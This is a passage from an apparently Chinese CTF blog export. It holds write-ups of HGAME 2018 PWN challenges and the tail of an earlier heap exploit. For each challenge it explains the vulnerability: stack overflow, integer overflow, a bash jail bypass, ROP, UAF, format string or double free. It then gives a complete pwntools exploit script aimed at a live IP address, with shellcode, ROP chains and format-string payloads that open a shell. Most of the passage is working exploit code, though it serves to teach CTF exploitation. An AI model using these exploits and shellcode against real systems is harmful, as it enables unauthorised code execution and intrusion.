p.sendline(&apos;0&apos;)p.recvuntil(&apos;Action:&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Size:&apos;)p.sendline(str(0x4000))p.recvuntil(&apos;blocks:&apos;)p.sendline(str(1))p.recvuntil(&apos;(0/1):&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Input:&apos;) p.send(&apos;/bin/sh\0&apos;+p64(0)*(2+4+2+8+3-1))padding = p64(0)*(0x4000/8-2-4-8-3) +p64(0)+ p64(0x11) + p64(0)*4 +p64(0) + p64(0)*5+p64(0x60201d)+ p64(0)*4 #p64(0x602028-4)print hex(len(padding))p.send(padding)#gdb.attach(p,&apos;info threads&apos;)p.recvuntil(&apos;Action:&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Size:&apos;)p.sendline(str(0x60))p.recvuntil(&apos;blocks:&apos;)p.sendline(str(0))p.recvuntil(&apos;(0/1):&apos;)p.sendline(&apos;1&apos;)p.recvuntil(&apos;Input:&apos;)p.send(&apos;sh\0&apos;+p64(0)+p64(0x400978)+p64(0)*(0x60/8)) p.interactive() ​ # 其他 1. 打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。 2. 想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验 123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;pthread.h&gt;static int num;void *thread_func()&#123; char *a ; a = malloc(0x80); printf("[%d] malloc address %p\n",num++,a); sleep(10);&#125;int main()&#123; pthread_t tid[40]; int i; void * ret; char *a; num = 0; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); printf("this is a test for thread arena! %d\n",num); for(i = 0; i&lt;33;i++)&#123; pthread_create(&amp;tid[i],NULL,thread_func,NULL); &#125; a = malloc(0x80); printf("[*] main malloc address %p\n",a); for(i = 0; i&lt;33;i++)&#123; //pthread_create(&amp;tid[i],NULL,thread_func,NULL); pthread_join(tid[i],0); &#125; sleep(10);&#125;]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME 2018 PWN题记录]]></title>
    <url>%2F2018%2F03%2F06%2Fhgame%2F</url>
    <content type="text"><![CDATA[HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。 LEVEL - WEEK 1guess_number题目流程很简单，首先使用/dev/urandom文件生成随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。 这题存在一个明显的栈溢出漏洞，但是开启了canary保护。起初思路被urandom函数带偏了，以为是要用伪随机本地爆破rand()种子，再进行生成，还暗搓搓的感叹好难啊。。后来发现在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。 解题的exp脚本如下 1234567891011121314151617181920#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./guess_number') context.log_level = 'debug'else: p = remote('111.230.149.72 ', 10002)p.recvuntil('enter your guess:')a = "0\x00"a = a.ljust(0x128,'\x00')print len(a)p.sendline(a)print p.recv()p.interactive() flag_server题目的内容是一个登陆系统，当用户输入”admin”和随机数密码时可以将一个v9变量赋值为1，进一步可以执行system(‘cat flag’) 其中，存在一个明显的整数负数溢出漏洞，当输入的长度是负数的时候，可以输入任意长的内容，在read_n函数中溢出，则可以覆盖到调用read_n函数的main函数栈中，进一步可以覆盖v9变量为任意值，导致控制逻辑流程。 解题的exp脚本如下： 1234567891011121314151617181920from pwn import *import timedebug=0if debug: p= process('./flag_server') context.log_level = 'debug'else: p = remote('111.230.149.72 ', 10001)p.recvuntil('your username length: ')p.sendline('-1')p.recvuntil('whats your username?')a = "admin"a = a.ljust(0x50,'1')print len(a)p.sendline(a)print p.recv()p.interactive() zazahui一道贪玩蓝月梗的题目，在初始化函数中，分别将广告词和flag读到bss段中，在sub_8048698()函数中，一直让用户输入广告词。 漏洞被故意留在sub_8048698函数中，根据栈中变量位置和输入长度可以很明显的发现可以覆盖s这个变量，当把变量覆盖为flag地址时，在puts(s)中就可以读出flag。 使用的exp脚本如下： 1234567891011121314151617#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./zazahui') context.log_level = 'debug' gdb.attach(p,'b *0x80486D5')else: p = remote('111.230.149.72 ', 10003)p.recvuntil('&gt;')a= 'a'*0xb0+p32(0x804A060)+p32(0x99)p.sendline(a)p.recv()p.interactive() LEVEL - WEEK 2ez_shellcode代码逻辑从题目名字中就可猜测出来，用户输入一串shellcode，程序来执行，仅仅限制了shellcode长度不超过24个字节。 这样一来，pwntools的shellcraft.sh()就不能用了，只能手写一个shellcode拿到shell。其原理是执行int 80h，使得ebp指向’/bin/sh’,eax的值是0xb,ecx、edx置零就可以了。 解题使用的exp脚本如下： 12345678910111213141516171819202122232425262728293031#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./ez_shellcode') context.log_level = 'debug' gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10004)p.recvuntil('&gt;')shellcode = '''push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxpush 0xbpop eaxint 0x80'''a = shellcraft.sh()print len(asm(shellcode))p.sendline(asm(shellcode))p.interactive() ez_bash_jail此题给用户一个system(lineptr)的权利，但是限制了用户输入’abcfhgilnst‘这些字母。这样一来如’cat flag’、’cat fl\‘、’sh’、’/bin/sh’就都不能用了。 题目给了hint，是研究一下system源码：https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system 123456789101112131415161718192021222324252627282930313233343536373839... ...116 #ifdef FORK117 pid = FORK ();118 #else119 pid = __fork ();120 #endif121 if (pid == (pid_t) 0)122 &#123;123 /* Child side. */124 const char *new_argv[4];125 new_argv[0] = SHELL_NAME;126 new_argv[1] = "-c";127 new_argv[2] = line;128 new_argv[3] = NULL;129 130 /* Restore the signals. */131 (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL);132 (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL);133 (void) __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL);134 INIT_LOCK ();135 136 /* Exec the shell. */137 (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);138 _exit (127);139 &#125;140 else if (pid &lt; (pid_t) 0)141 /* The fork failed. */142 status = -1;143 else144 /* Parent side. */145 &#123;146 /* Note the system() is a cancellation point. But since we call147 waitpid() which itself is a cancellation point we do not148 have to do anything here. */149 if (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, 0)) != pid)150 status = -1;151 &#125;... 可以看到system的最后是执行了execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=lineptr 的。 再看一下execve的用法是什么： 1execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。 就是可以重新执行一份新的代码。 再看下一个hint，学习一下shell的变量,正则等等? 题目中过滤了许多正常字符，但是\$符号没有被过滤，$是bash脚本中一个特殊的符号，可以定义变量，在搜索中发现bash中有几个特殊的变量 1234567$0就是该bash文件名$?是上一指令的返回值$*所有位置参数的内容：就是调用调用本bash shell的参数。$@基本上与上面相同。只不过是“$*”返回的是一个字符串，字符串中存在多外空格。“$@”返回多个字符串。&quot;$1&quot;，它代表一条记录中的第一列数据 其中最特殊的是$0，它是执行execve程序时的filename路径。可以通过如下代码测试出来 123456789101112131415161718192021222324a#! /bin/shecho &quot;=============&quot;echo $0echo &quot;=============&quot;main.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[])&#123; char *newargv[] = &#123; &quot;xx&quot; &#125;; char *newenviron[] = &#123; NULL &#125;; newargv[0] = argv[1]; execve(&quot;./a&quot;, newargv, newenviron); perror(&quot;execve&quot;); /* execve() only returns on error */ exit(EXIT_FAILURE);&#125; 因此可以发现在题目中执行system(lineptr)时，如果lineptr=’$0’的话，实际上执行的是execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=’\$0’ 而\$0就是’/bin/sh’，进一步就获得了shell。 题解的exp脚本如下： 123456789101112131415#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./bash_jail') context.log_level = 'debug' #gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10006)p.recvuntil('&gt;')p.sendline('$0')p.interactive() hacker_system_v1程序功能较多，但留下的漏洞很明显， 用户可以自定义输入长度，但是用于存储的空间是一定的，因此存在栈溢出漏洞，并且没有开启canary保护。 通常的栈溢出需要泄露libc地址，因此构造的rop分成两段，首先打印出puts@got泄露出libc地址，再read另一段rop到bss段中可以写的位置，最终将栈迁移过去。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding:utf-8from pwn import *import timedebug=0elf = ELF('./hacker_system_ver1')if debug: p= process('./hacker_system_ver1') context.log_level = 'debug' libc = ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(p,'b *0x8048B1B')else: p = remote('111.230.149.72 ', 10005) libc = ELF('./libc32.so')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline('200')p.recvuntil('name:')padding = 'a'*0x34pr = 0x08048455pppr = 0x08048d49rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)p.sendline(rop)p.recvuntil('find!!\n')puts_addr = u32(p.recv(4))print '[+]puts address:',hex(puts_addr)libc.address = puts_addr-libc.symbols['puts']print '[+]system address:',hex(libc.symbols['system'])rop = p32(0x804bc00)+ p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(next(libc.search('/bin/sh')))p.send(rop)p.interactive()'''============================================================0x08048d4b : pop ebp ; ret0x08048d48 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048455 : pop ebx ; ret0x08048d4a : pop edi ; pop ebp ; ret0x08048d49 : pop esi ; pop edi ; pop ebp ; ret0x0804843e : ret0x080487f0 : ret 0x458b0x0804819c : ret 0x86940x080485ce : ret 0xeac1''' ez_shellcode_ver2这个是ez_shellcode的升级版本，对shellcode长度没有限制，仅限制shellcode是a~zA~Z0~9范围内，这样的shellcode叫alpha shellcode，利用msfencode可以生成，但大多数时候都直接使用可以百度到的orz http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int 80这样的指令。 解题的exp脚本如下： 1234567891011121314151617181920#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./ez_shellcode_ver2') context.log_level = 'debug' #gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10007)p.recvuntil('&gt;')shellcode = '''PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'''#a = shellcraft.sh()#print len(asm(shellcode))p.sendline((shellcode))p.interactive() LEVEL - WEEK 3hacker_system_ver2这是第二周题目的升级版，除了编译环境从x86转换到了x64没任何差别，包括漏洞。 因此利用同样的解题思路进行rop构造，仅是gadget的使用方法不同罢了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *import timedebug=0elf = ELF('./hacker_system_ver2')if debug: p= process('./hacker_system_ver2') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400d74')else: p = remote('111.230.149.72 ', 10008) libc = ELF('./libc64.so')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline('200')p.recvuntil('name:')padding = 'a'*0x30#pr = 0x08048455#pppr = 0x08048d49rdi_ret = 0x0000000000400fb3rsi_ret = 0x0000000000400fb1rbp_ret = 0x0000000000400800rop = padding + p64(0x602e00) + p64(rdi_ret) +p64(elf.got['puts']) + p64(elf.symbols['puts']) + p64(rsi_ret) + p64(0x602e00) + p64(0x602e00) + p64(rdi_ret) + p64(0) + p64(elf.symbols['read']) + p64(rbp_ret) + p64(0x602e00) + p64(0x400D74)#rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)p.sendline(rop)p.recvuntil('find!!\n')puts_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]puts address:',hex(puts_addr)libc.address = puts_addr-libc.symbols['puts']print '[+]system address:',hex(libc.symbols['system'])rop = p64(0x602c00)+ p64(rdi_ret) +p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])p.send(rop)p.interactive()'''Gadgets information============================================================0x0000000000400fac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400fae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400fb0 : pop r14 ; pop r15 ; ret0x0000000000400fb2 : pop r15 ; ret0x0000000000400fab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400faf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400800 : pop rbp ; ret0x0000000000400fb3 : pop rdi ; ret0x0000000000400fb1 : pop rsi ; pop r15 ; ret0x0000000000400fad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006a9 : ret0x0000000000400a29 : ret 0x8b48Unique gadgets found: 12''' calc题目中实现了一个简单的计算器。题目采用静态编译的方法，编译了需要的所有函数。 漏洞在于每次存储结果时，计数器会往后移4个字节，但是对于存储结果个数没有限制，导致栈溢出。 利用ROPgadget的ropchain功能，对于静态编译的程序，很容易可以生成一个rop链，将rop链覆盖在返回地址处即可。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from struct import packfrom pwn import *import timedebug=0if debug: p= process('./calc') #context.log_level = 'debug'else: p= remote('111.230.149.72 ', 10009)def get_rop_string(): rop = '' rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea060) # @ .data rop += pack('&lt;I', 0x080b8446) # pop eax ; ret rop += '/bin' rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea064) # @ .data + 4 rop += pack('&lt;I', 0x080b8446) # pop eax ; ret rop += '//sh' rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08049603) # xor eax, eax ; ret rop += pack('&lt;I', 0x080551fb) # mov dword ptr [edx], eax ; ret rop += pack('&lt;I', 0x080481c9) # pop ebx ; ret rop += pack('&lt;I', 0x080ea060) # @ .data rop += pack('&lt;I', 0x080dee5d) # pop ecx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08056ad3) # pop edx ; ret rop += pack('&lt;I', 0x080ea068) # @ .data + 8 rop += pack('&lt;I', 0x08049603) # xor eax, eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0807b01f) # inc eax ; ret rop += pack('&lt;I', 0x0806d445) # int 0x80 return ropdef add_save(num): p.recvuntil('&gt;') p.sendline('1') p.recvuntil('a:') p.sendline(str(num)) p.recvuntil('b:') p.sendline('0') p.recvuntil('&gt;&gt;&gt;') p.recvuntil('&gt;') p.sendline('5') p.recvuntil('success!!')def padding(): for i in range(0,64): add_save(0xbadbad) print '[+] round',str(i) add_save(68)def rop_input(rop_string): for i in range(len(rop_string)/4): print hex(u32(rop_string[4*i:4*(i+1)])) add_save(u32(rop_string[4*i:4*(i+1)]))padding()#gdb.attach(p,'b *0x8048AC0')rop='\xd3j\x05\x08`\xa0\x0e\x08F\x84\x0b\x08/bin\xfbQ\x05\x08\xd3j\x05\x08d\xa0\x0e\x08F\x84\x0b\x08//sh\xfbQ\x05\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\xfbQ\x05\x08\xc9\x81\x04\x08`\xa0\x0e\x08]\xee\r\x08h\xa0\x0e\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08E\xd4\x06\x08'#print '[*] flag',flagrop_input(rop)p.recvuntil('&gt;')p.sendline('6')p.recvuntil('bye.')p.sendline('cat flag')p.interactive() zazahui_ver2和上一版本的zazahui有所不同，这次利用的是strcmp的比较。 同样存在s的溢出覆盖，不过此次不能简单的使用溢出来打印flag了，但是strcmp仍然可以利用，就是爆破。 逆向爆破flag的地址，可以大大缩短爆破次数。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./zazahui_ver2') #context.log_level = 'debug' gdb.attach(p,'b *0x80487AB')else: p = remote('111.230.149.72 ', 10010)dic = range(33,127)dic.append(0)#qdic.reverse()p.recvuntil('&gt;')start = 0x804A084end = 0x804A060flag=''i = start while i&gt;=end: pro = log.progress('go') for j in dic: pro.status('boom for '+hex(i)) bomb = (chr(j)+flag)+'\0'*(0xb0-len((chr(j)+flag)))+p32(i) p.send(bomb) if 'too' in p.recvuntil('&gt;'): flag = chr(j) + flag pro.success(hex(i)+': '+hex(j)+' '+chr(j)) i = i-1#a= 'a'*0xb0+p32(0x804A060)+p32(0x99)#p.recv()print '[*] flag',flagp.interactive() message_saver程序实现了一个可以加解密存储的记事本，逻辑简单 只维护了一个变量作为message的存储结构，结构如下 123+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| length | address | function ptr | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 其生成方法在add函数中： 在edit函数中可以重新编辑信息，在编辑过程中会重新申请一个内存块，但原来的并不会释放（内存泄露），最终会执行function（address）函数，主要如果可以控制内存块的内容，就完全可以控制执行逻辑。 在delete函数中会free掉这个内存块，但并未置空结构体，存在一个悬垂指针。 并且，在全部的函数中都没有检测都没有检测是否已经删除了结构块，导致一个UAF漏洞、double free漏洞。 利用UAF漏洞可以很容易的控制程序执行流程： 先申请一个非0x18的块，delete之后，在edit一个0x18的块，就可以劫持结构体内容了。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import timedebug=0elf = ELF('./message_saver')if debug: p= process('./message_saver') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400C64')else: p = remote('111.230.149.72 ', 10011) libc = ELF('./libc64.so')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('length:')p.sendline(str(0x100))p.sendline('p4nda')p.recvuntil('===')p.sendline('2')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline(str(0x18))p.recvuntil('message:')p.sendline(p64(0x00)+p64(elf.got['puts'])+p64(0x40084D))p.recvuntil('&gt;')p.sendline('3')p.sendline('\0\0\0'+p64(0x00)+p64(elf.got['puts'])+p64(elf.symbols['puts']))p.recvuntil('&gt;')p.sendline('3')tmp = p.recvuntil('\n==')addr = tmp[-9:-3]puts_addr = u64(addr.ljust(8,'\0'))print '[+]puts addr : ',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+]system addr :',hex(libc.symbols['system'])p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.recvuntil('length:')p.sendline(str(0x18))p.recvuntil('message:')p.sendline('/bin/sh\0'+p64(elf.got['puts'])+p64(libc.symbols['system']))p.interactive() LEVEL - WEEK 4ascii_art_market题目是一个简单的ASCII码艺术字生成器，但对题目没有什么影响，关键点在于main函数中存在一个0x10比特的栈溢出，导致可以覆盖rbp和返回地址。但这远不够获得shell。 最初的想法是先把rbp迁移到一个可写的地方，然后慢慢调试返回地址到哪里去，一个直接的想法是继续输入，争取更大的rop链，因此先把返回地址写到0x4009fc，这个位置可以继续输入，调试时发现，这样覆盖会把输入内容写到bss-0x80的位置去。这样再把栈迁移到bss-0x80就可以执行输入的rop了，第二次再覆盖时，利用leave ret将栈迁移到bss段上，就可以执行任意的rop了，使用的rop和hacker_system中的相同。 解题的exp脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import timedebug=0elf = ELF('./ascii_art_maker')if debug: p= process('./ascii_art_maker') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x0400A2B')else: p = remote('111.230.149.72 ', 10012) libc = ELF('./libc64.so')target = 0x4009FCp.recvuntil('convert:')p.send('a'*0x80+p64(0x602c00)+p64(target))rdi_ret = 0x0000000000400a93rsi_ret = 0x0000000000400a91rbp_ret = 0x0000000000400640rop =p64(0xbadbad)+ p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.symbols['puts'])+ p64(rsi_ret) + p64(0x602e00) + p64(0x602e00) + p64(rdi_ret) + p64(0) + p64(elf.symbols['read']) + p64(rbp_ret) + p64(0x602e00) + p64(0x400A2B)rop = rop.ljust(0x80,'a')+p64(0x602c00-0x80)+p64(0x400A2B)#p.send(p64())p.send(rop)addr_leak = p.recvuntil('\x7f')[-6:]puts_addr = u64(addr_leak.ljust(8,'\0'))print '[+] puts : ',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+] system: ',hex(libc.symbols['system'])rop = p64(0x602c00)+ p64(rdi_ret) +p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])p.send(rop)p.interactive()'''============================================================0x0000000000400a8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a90 : pop r14 ; pop r15 ; ret0x0000000000400a92 : pop r15 ; ret0x0000000000400a8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400a8f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400640 : pop rbp ; ret0x00000000004009dd : pop rbx ; pop rbp ; ret0x0000000000400a93 : pop rdi ; ret0x0000000000400a91 : pop rsi ; pop r15 ; ret0x0000000000400a8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : ret0x0000000000400980 : ret 0x458b''' base64_decoder题目是一个base64解码器，将用户输入的字符串经过base64解码，然后打印出来。 存在一个明显的格式化字符串漏洞，并且字符串漏洞在栈上，可以对内存地址任意写。 起初以为很简单，直接使用了之前给的libc文件，却发现怎么搞也搞不通，猜测是libc被替换了，学习使用了libc database，找到了题目使用的libc——libc6-i386_2.19-0ubuntu6.14_amd64.so。 可以参考置顶日志的libc database使用方法 最终利用system替换strcmp执行system(‘/bin/sh’)，解题脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8'''%7$p offset'''from pwn import *import time,base64debug=0elf = ELF('./base64_decoder')if debug: p= process('./base64_decoder') context.log_level = 'debug' libc=ELF('/lib/i386-linux-gnu/libc.so.6') gdb.attach(p,'b *0x8048945')else: p = remote('111.230.149.72',10013)#process('./pwn1') libc = ELF('./libc6-i386_2.19-0ubuntu6.14_amd64.so')#base64.b64encode(s, altchars=None) p.recvuntil('&gt;')p.sendline(base64.b64encode('%2$p'))heap_addr = p.recvline()print '[*] heap addr:',heap_addrheap_addr_int = int(heap_addr[3:-1],16)print '[*] heap addr:',hex(heap_addr_int)p.recvuntil('&gt;')fmt = p32(heap_addr_int-0x110)+"%%%dc%%%d$hhn"%(200,7)p.sendline(base64.b64encode(fmt))p.recvuntil('&gt;')fmt = p32(elf.got['printf'])+"%7$s"p.sendline(base64.b64encode(fmt))p.recvuntil('\x08')printf_addr = u32(p.recv(4))print '[*] printf addr:',hex(printf_addr)p.recvuntil('&gt;')fmt = p32(elf.got['puts'])+"%7$s"p.sendline(base64.b64encode(fmt))p.recvuntil('\x08')puts_addr = u32(p.recv(4))print '[*] puts addr:',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[*] system addr:',hex(libc.symbols['system'])target = libc.symbols['system'] #print '[+] strcmp@got: ',hex(elf.got['strcmp'])p.recvuntil('&gt;')fmt = fmtstr_payload(7, &#123;elf.got['strcmp']: target&#125;, write_size='byte')p.sendline(base64.b64encode(fmt))p.recvuntil('&gt;')p.interactive() hacker_system_ver3函数维护了一个bss段上的结构体数组，其每一个结构体的大小是0x38， 123456789100x00 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | length | name 1 | 0x10 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | name 2 | name 3 | 0x20 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | name 4 | age | 0x30 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | intr addr | 0x38 +-+-+-+-+-+-+- 其漏洞在于删除函数中，利用name寻址，将intr address释放后，再释放该结构体，最终将数组的该位置置空。 但问题在于，当出现name相同的结构体时，仅置空了最后一个数组的指针，造成之前的指针均为悬垂指针，进而造成double free漏洞。 该double free漏洞可以控制任意大小的fastbin，原因是，在add 功能时，可以add任意大小的内存块。 这里采用了bluecake@dubhe大佬的fastbin利用方法。 劫持两个fastbin的链来构造新的fake bin块。最终覆写top地址，将top地址覆写为不存在canary保护的函数栈上，再申请堆块是，会把栈地址分配给用户，进一步可以写rop，劫持控制流，拿到shell。 解题的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from pwn import *#import time,base64debug=0elf = ELF('./hacker_system_ver3')if debug: p= process('./hacker_system_ver3') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p)#,'b*0x0400F6D'else: p = remote('111.230.149.72',10014)#process('./pwn1') libc = ELF('./libc64.so')def add(name,age,length,intro): p.recvuntil('&gt;') p.sendline('1') p.recvuntil('name:') p.send(name) p.recvuntil('age:') p.sendline(str(age)) p.recvuntil('length:') p.sendline(str(length)) p.recvuntil('intro:') p.sendline(intro)def print_user(name): p.recvuntil('&gt;') p.sendline('2') p.recvuntil('name:') p.sendline(name)def delete_user(name): p.recvuntil('&gt;') p.sendline('3') p.recvuntil('name:') p.sendline(name)#step 1 leak libcadd('step1\n',0,0x20,'hack by p4nda')add('step1\n',0,0x20,'hack by p4nda')delete_user('step1')add('nop1\n',0,0x38,p64(0x18)+'1'.ljust(0x20,'\0')+p64(3)+p64(elf.got['puts']))print_user('1')p.recvuntil('intro:')puts_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]puts addr :',hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']print '[+]system addr :',hex(libc.symbols['system'])#step 2 leak steakadd('step2\n',0,0x20,'hack by p4nda')add('step2\n',0,0x20,'hack by p4nda')delete_user('step2')add('nop2\n',0,0x38,p64(0x18)+'2'.ljust(0x20,'\0')+p64(3)+p64(libc.symbols['environ']))print_user('2')p.recvuntil('intro:')stack_addr = u64(p.recv(6).ljust(8,'\0'))print '[+]stack addr :',hex(stack_addr)stack_offset =0x7ffd3af20438-0x7ffd3af20330#add('padding\n',18,0x138,'hack by p4nda')#delete_user('nop2')#delete_user('2')#delete_user()'''add('padding_3\n',18,0x20,'hack by p4nda')add('step3\n',18,0x20,'hack by p4nda')add('step3\n',18,0x20,'hack by p4nda')delete_user('step3')add('nop3\n',18,0x38,p64(0x18)+'3'.ljust(0x20,'\0')+p64(3)+p64(0))delete_user('nop3')delete_user('3')delete_user('padding_3')add('ctrl3\n',18,0x38,p64(0xdeadbeef))'''add('step3\n',0,0x70,'hack by p4nda')add('step3\n',0,0x70,'hack by p4nda')delete_user('step3')delete_user('step3')print '[+]stack addr :',hex(stack_addr)#gdb.attach(p,'b *0x400a0f')add('step3\n',0,0x70,p64(0x61))add('step3\n',0,0x70,'hack by p4nda')add('step3\n',18,0x70,'hack by p4nda')add('step4\n',0,0x50,'hack by 